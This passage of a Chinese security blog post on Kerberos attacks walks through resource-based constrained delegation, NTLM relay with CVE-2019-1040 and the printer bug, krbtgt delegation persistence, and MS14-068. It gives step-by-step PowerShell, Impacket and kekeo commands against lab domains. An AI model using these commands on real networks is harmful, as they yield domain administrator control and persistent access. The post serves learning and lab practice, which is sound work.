+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">powershell</span><br><span class="line">Set-ExecutionPolicy Bypass -Scope Process</span><br><span class="line">import-module .\Powermad.ps1</span><br><span class="line">New-MachineAccount -MachineAccount test3 -Password $(ConvertTo-SecureString &quot;123456&quot; -AsPlainText -Force)</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230408153516233.png"
+                      alt="image-20230408153516233"
+                ></p>
+<p>设置委派</p>
+<p>查询test3的sid</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Set-ExecutionPolicy Bypass -Scope Process</span><br><span class="line">import-module .\powerview.ps1</span><br><span class="line">Get-NetComputer test3 -Properties objectsid</span><br></pre></td></tr></table></figure></div>
+
+<p>test3 sid:S-1-5-21-1400638014-602433399-2258725660-1152</p>
+<p>修改WEB的msds-allowedtoactonbehalfofotheridentity的值</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">powershell</span><br><span class="line">Set-ExecutionPolicy Bypass -Scope Process</span><br><span class="line">import-module .\powerview.ps1</span><br><span class="line">$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList &quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1400638014-602433399-2258725660-1152)&quot;</span><br><span class="line">$SDBytes = New-Object byte[] ($SD.BinaryLength)</span><br><span class="line">$SD.GetBinaryForm($SDBytes, 0)</span><br><span class="line">Get-DomainComputer WEB| Set-DomainObject -Set @&#123;&#x27;msds-allowedtoactonbehalfofotheridentity&#x27;=$SDBytes&#125; -Verbose</span><br></pre></td></tr></table></figure></div>
+
+<p>生成票据</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 getST.py -dc-ip 192.168.30.10 hack-my.com/test3\$:123456 -spn cifs/WEB.hack-my.com -impersonate administrator</span><br></pre></td></tr></table></figure></div>
+
+<p>将生成的票据导入</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">export KRB5CCNAME=administrator.ccache   </span><br><span class="line"></span><br><span class="line">python3 wmiexec.py WEB.hack-my.com -no-pass -k -dc-ip 192.168.30.10</span><br></pre></td></tr></table></figure></div>
+
+<p>然后就获得主机的控制权</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230408154535638.png"
+                      alt="image-20230408154535638"
+                ></p>
+<h6 id="利用3-1"><a href="#利用3-1" class="headerlink" title="利用3"></a>利用3</h6><p>结合HTLM Relay接管域控（CVE-2019-1040）</p>
+<p>需要用到辅助域控win2016</p>
+<p>DC2 10.150.127.186</p>
+<p>首先就是创建一个机器用户test2 123456</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">powershell</span><br><span class="line">Set-ExecutionPolicy Bypass -Scope Process</span><br><span class="line">import-module .\Powermad.ps1</span><br><span class="line">New-MachineAccount -MachineAccount test2 -Password $(ConvertTo-SecureString &quot;123456&quot; -AsPlainText -Force)</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230408155940211.png"
+                      alt="image-20230408155940211"
+                ></p>
+<p>然后开启监听</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 ntlmrelayx.py -t ldap://10.150.127.166 -smb2support --remove-mic --delegate-access --escalate-user test2\$</span><br></pre></td></tr></table></figure></div>
+
+<p>然后利用打印机漏洞</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 printerbug.py haishi.com/many:asd123\!\@10.150.127.186 10.150.127.128</span><br></pre></td></tr></table></figure></div>
+
+<p>然后申请票据</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 getST.py haishi.com/test2\$:123456 -spn CIFS/DC2.haishi.com -impersonate Administrator -dc-ip 10.150.127.166</span><br></pre></td></tr></table></figure></div>
+
+<p>导入票据</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">export KRB5CCNAME=administrator.ccache   </span><br><span class="line"></span><br><span class="line">python3 wmiexec.py WEB.hack-my.com -no-pass -k -dc-ip 10.150.127.186</span><br></pre></td></tr></table></figure></div>
+
+<p>成功</p>
+<p>ntlm-relay攻击的前提是，smb认证获取的机器没有开启smb签名</p>
+<p>cve-2019-1040作用是绕过mic检验，因为打印机触发的是smb协议，域控是默认带有smb签名的，而这个漏洞在这里就刚好绕过了mic检验，就完成了 ntlm-relay攻击</p>
+<h6 id="利用4-1"><a href="#利用4-1" class="headerlink" title="利用4"></a>利用4</h6><p>黄金票据变种</p>
+<p>主要原理就是在获得域控权限后，对krbtgt用设置委派属性，来打造黄金票据，进行权限维持</p>
+<p>步骤</p>
+<p>创建一个机器账户 test4 123456</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230408161503905.png"
+                      alt="image-20230408161503905"
+                ></p>
+<p>具体的不说了</p>
+<p>然后来到域控上</p>
+<p>powershell，去配置基于资源的约束委派</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Set-ADUser krbtgt -PrincipalsAllowedToDelegateToAccount test4$</span><br><span class="line">Get-ADUser krbtgt -Properties PrincipalsAllowedToDelegateToAccount</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230408161546381.png"
+                      alt="image-20230408161546381"
+                ></p>
+<p>成功</p>
+<p>现在来说krbtgt的密码hash怎么变都不会影响黄金票据的打造</p>
+<p>申请票据（kali）</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 getST.py haishi.com/test4\$:123456 -spn krbtgt -impersonate administrator -dc-ip 10.150.127.166</span><br></pre></td></tr></table></figure></div>
+
+<p>导入票据</p>
+<div class="highlight-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">export KRB5CCNAME=administrator.ccache</span><br><span class="line"></span><br><span class="line">python3 smbexec.py -k administrator@DC.haishi.com -no-pass -dc-ip 10.150.127.166</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230408161735293.png"
+                      alt="image-20230408161735293"
+                ></p>
+<p>完美</p>
+<p>总结：委派可以比喻为你叫别人拿快递，你得把自己的取件码（票据）发给他才能找到你得快递</p>
+<p>但是如果你买的东西涉及个人隐私，别人拿到你的取件码（票据）就会导致隐私泄露的问题，不过一般涉及隐私的也不会找别人拿，所以得使点手段了</p>
+<p>这就像域控被委派导致其他主机账户具有域控的权限，就可以为所欲为</p>
+<p>被委派的对象会将自己的票据发给委派主机，这是委派的机制，是不会变的</p>
+<p>所以攻击思路就是想办法拿到域控的“取件码”，可以认为是强迫域控让你帮他拿快递，这样你就拿到域控的取件码（票据）就可以干域控可以干的事了</p>
+<h3 id="PAC攻击"><a href="#PAC攻击" class="headerlink" title="PAC攻击"></a>PAC攻击</h3><h4 id="MS14-068"><a href="#MS14-068" class="headerlink" title="MS14-068"></a>MS14-068</h4><p>这个漏洞的原因是KDC无法正确检查PAC中的有效签名，因为实现签名的加密允许所有的签名算法，只要客户端指定任意签名算法，KDC服务器就会使用指定的算法进行签名验证，所以不需要相关的密钥算法，比如md5</p>
+<p>这就导致了用户可以自己构造一张PAC，伪造用户的SID和所在的组</p>
+<p>这个伪造的PAC，加入域管相关信息，访问域控服务，KDC就会认为该用户有权限，就把他当作域管理组的成员，这就为提升到域管理员提供了条件</p>
+<h6 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h6><p>通过WIN2008上利用kekeo执行这个命令，就可以成功的访问域控的CIFS服务</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kekeo.exe &quot;exploit::ms14068 /domain:hack-my.com /user:username /password:password /ptt&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure></div>
+
+
+            </div>
+
+            
+                <div class="post-copyright-info">
+                    <div class="article-copyright-info-container">
+    <ul>
+        <li>Post title：Kerberos攻击</li>
+        <li>Post author：yuBetter</li>
+        <li>Create time：2023-04-14 21:35:20</li>
+        <li>
+            Post link：https://yubetter.github.io/2023/04/14/Kerberos攻击/
+        </li>
+        <li>
+            Copyright Notice：All articles in this blog are licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> unless stating additionally.
+        </li>
+    </ul>
+</div>
+
+                </div>
+            
+
+            
+
+            
+
+            
+                <div class="article-nav">
+                    
+                    
+                        <div class="article-next">
+                            <a class="next"
+                            rel="next"
+                            href="/2023/04/14/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"
+                            >
+                                <span class="title flex-center">
+                                    <span class="post-nav-title-item">权限提升</span>
+                                    <span class="post-nav-item">Next posts</span>
+                                </span>
+                                <span class="right arrow-icon flex-center">
+                                    <i class="fa-solid fa-chevron-right"></i>
+                                </span>
+                            </a>
+                        </div>
+                    
+                </div>
+            
+
+
+            
+        </div>
+
+        
+            <div class="toc-content-container">
+                <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">Kerberos攻击</div>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-text"></span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#AS-REQ-amp-AS-REP%E9%98%B6%E6%AE%B5%E6%94%BB%E5%87%BB"><span class="nav-text">AS_REQ&amp;AS_REP阶段攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%9F%E5%86%85%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE"><span class="nav-text">域内用户枚举</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%9E%9A%E4%B8%BE%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="nav-text">枚举工具的使用</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AF%86%E7%A0%81%E5%96%B7%E6%B4%92"><span class="nav-text">密码喷洒</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%96%B7%E6%92%92%E5%8E%9F%E7%90%86"><span class="nav-text">喷撒原理</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#AS-REP-Roasting%E6%94%BB%E5%87%BB"><span class="nav-text">AS_REP Roasting攻击</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E6%94%BB%E5%87%BB"><span class="nav-text">黄金票据攻击</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#TGS-REQ-amp-TGS-REP%E9%98%B6%E6%AE%B5%E6%94%BB%E5%87%BB"><span class="nav-text">TGS_REQ&amp;TGS_REP阶段攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Kerberosast%E6%94%BB%E5%87%BB"><span class="nav-text">Kerberosast攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%89%8D%E7%9E%BB%E7%9F%A5%E8%AF%86"><span class="nav-text">前瞻知识</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%B3%A8%E5%86%8C%E6%96%B9%E5%BC%8F%E6%9C%89%E4%B8%A4%E7%A7%8D%EF%BC%9A"><span class="nav-text">注册方式有两种：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%88%A4%E6%96%AD%E6%8C%87%E4%BB%A4"><span class="nav-text">判断指令</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E8%BF%87%E7%A8%8B"><span class="nav-text">攻击过程</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E6%89%8B%E6%AE%B5"><span class="nav-text">攻击手段</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE%E6%94%BB%E5%87%BB"><span class="nav-text">白银票据攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%EF%BC%88SID%EF%BC%8C%E6%89%80%E5%A4%84%E5%9F%9F%EF%BC%8C%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%90%8D%EF%BC%8CNTLM-HASH%EF%BC%89-%E5%9F%9F%E6%8E%A7"><span class="nav-text">基本信息获取（SID，所处域，服务器名，NTLM HASH）(域控)</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E4%BC%AA%E9%80%A0%E5%85%B1%E4%BA%AB%E6%96%87%E4%BB%B6%E5%A4%B9%E6%9C%8D%E5%8A%A1%EF%BC%88cifs%EF%BC%89%E6%9D%83%E9%99%90%EF%BC%8Cmimkatz-%E5%9F%9F%E5%86%85%E5%85%B6%E4%BB%96%E4%B8%BB%E6%9C%BA"><span class="nav-text">伪造共享文件夹服务（cifs）权限，mimkatz(域内其他主机)</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E4%BC%AA%E9%80%A0LDAP%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90"><span class="nav-text">伪造LDAP服务权限</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B"><span class="nav-text">攻击流程</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB"><span class="nav-text">委派攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE"><span class="nav-text">非约束委派</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%8E%A5%E4%B8%8B%E6%9D%A5%E5%BC%80%E5%A7%8B%E6%94%BB%E5%87%BB-%E5%88%A9%E7%94%A81"><span class="nav-text">接下来开始攻击  利用1</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%88%A9%E7%94%A82"><span class="nav-text">利用2</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B-1"><span class="nav-text">攻击流程</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB"><span class="nav-text">约束委派攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#S4U2Self%EF%BC%9A%E7%94%A8%E4%BA%8E%E7%94%9F%E6%88%90%E6%9C%AC%E8%BA%AB%E6%9C%8D%E5%8A%A1TGS%E7%A5%A8%E6%8D%AE"><span class="nav-text">S4U2Self：用于生成本身服务TGS票据</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#S4U2proxy%EF%BC%9A%E4%BF%9D%E8%AF%81%E5%8F%AA%E8%83%BD%E8%AE%BF%E9%97%AE%E7%89%B9%E5%AE%9A%E6%9C%8D%E5%8A%A1%EF%BC%88%E6%9C%80%E5%A4%A7%E5%8C%BA%E5%88%AB%EF%BC%89"><span class="nav-text">S4U2proxy：保证只能访问特定服务（最大区别）</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86"><span class="nav-text">攻击原理</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%B5%81%E7%A8%8B"><span class="nav-text">流程</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%88%A9%E7%94%A81"><span class="nav-text">利用1</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%88%A9%E7%94%A82-1"><span class="nav-text">利用2</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%88%A9%E7%94%A83"><span class="nav-text">利用3</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%88%A9%E7%94%A84"><span class="nav-text">利用4</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE"><span class="nav-text">基于资源的约束性委派</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E4%BC%98%E5%8A%BF"><span class="nav-text">优势</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%B7%AE%E5%88%AB"><span class="nav-text">差别</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%9D%A1%E4%BB%B6"><span class="nav-text">条件</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%80%8E%E4%B9%88%E6%9F%A5%E7%9C%8B%E6%98%AF%E8%B0%81%E6%8A%8A%E4%BD%A0%E5%8A%A0%E5%85%A5%E5%9F%9F%E7%9A%84"><span class="nav-text">怎么查看是谁把你加入域的</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#Account-Operators%E7%BB%84%E5%86%85%E7%94%A8%E6%88%B7"><span class="nav-text">Account Operators组内用户</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%88%A9%E7%94%A81-1"><span class="nav-text">利用1</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A4"><span class="nav-text">步骤</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%88%A9%E7%94%A82-2"><span class="nav-text">利用2</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%88%A9%E7%94%A83-1"><span class="nav-text">利用3</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%88%A9%E7%94%A84-1"><span class="nav-text">利用4</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PAC%E6%94%BB%E5%87%BB"><span class="nav-text">PAC攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#MS14-068"><span class="nav-text">MS14-068</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%88%A9%E7%94%A8"><span class="nav-text">利用</span></a></li></ol></li></ol></li></ol></li></ol></li></ol></li></ol>
+
+    </div>
+</div>
+            </div>
+        
+    </div>
+</div>
+
+
+                
+
+            </div>
+
+
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info">
+            &copy;
+            
+              <span>2023</span>
+              -
+            
+            2023&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">yuBetter</a>
+        </div>
+        
+            <script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    <span id="busuanzi_container_site_uv" class="busuanzi_container_site_uv">
+                        VISITOR COUNT&nbsp;<span id="busuanzi_value_site_uv" class="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="busuanzi_container_site_pv">
+                        TOTAL PAGE VIEWS&nbsp;<span id="busuanzi_value_site_pv" class="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="theme-info info-item">
+            <span class="powered-by-container">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" href="https://hexo.io">Hexo</a></span>
+                <br> 
+            <span class="theme-version-container">THEME&nbsp;<a class="theme-version" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v1.2.1</a>
+        </div>
+        
+        
+        
+            <div id="start_time_div" style="display:none">
+                2023/3/8 00:00:00
+            </div>
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+        
+            <script async data-pjax>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="unfolded-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-expand-width flex-center">
+            <i class="fa-regular fa-expand"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex-center">
+                <i class="fa-regular fa-arrow-up"></i>
+            </li>
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="folded-tools-list">
+        <li class="right-bottom-tools tool-toggle-show flex-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fa-solid fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fa-solid fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+
+</main>
+
+
+
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/layouts/menu-shrink.js"></script>
+
+<script src="/js/tools/go-top-bottom.js"></script>
+
+<script src="/js/tools/dark-light-toggle.js"></script>
+
+
+
+    
+<script src="/js/tools/local-search.js"></script>
+
+
+
+
+    
+<script src="/js/tools/code-block.js"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/layouts/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js"></script>
+
+
+
+
+
+
+
+<div class="post-scripts pjax">
+    
+        
+<script src="/js/tools/toc-toggle.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+<script src="/js/layouts/toc.js"></script>
+
+<script src="/js/plugins/tabs.js"></script>
+
+    
+</div>
+
+
+    
+<script src="/js/libs/pjax.min.js"></script>
+
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+            // scrollTo: true,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            REDEFINE.utils.pjaxProgressBarStart();
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            REDEFINE.utils.pjaxProgressBarEnd();
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
+            REDEFINE.refresh();
+        });
+    });
+</script>
+
+
+
+
+</body>
+</html>
